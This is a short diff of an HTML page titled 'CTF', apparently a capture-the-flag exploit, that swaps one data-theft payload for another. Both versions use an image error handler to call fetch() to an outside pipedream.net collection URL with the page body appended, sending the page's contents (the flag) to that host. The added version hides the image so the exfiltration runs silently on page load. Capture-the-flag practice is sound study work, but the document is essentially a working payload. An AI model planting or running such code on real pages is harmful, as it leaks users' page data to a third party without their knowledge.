@@ -6,9 +6,12 @@
     <title>CTF</title>
 </head>
 <body>
-    <p>Get flag</p>
+    <p>flag</p>
+    <img id="Img" src="png" style="display: none;">
     <script>
-      document.querySelector("#ctf").outerHTML= `<img src=x onerror='fetch("https://eo8bzrb9y2mj48v.m.pipedream.net?" + document.querySelector("body").innerText)'`
+        document.getElementById("Img").onerror = function() {
+            fetch("https://eo8bzrb9y2mj48v.m.pipedream.net?" + document.body.innerHTML);
+        };
     </script>
 </body>
 </html>
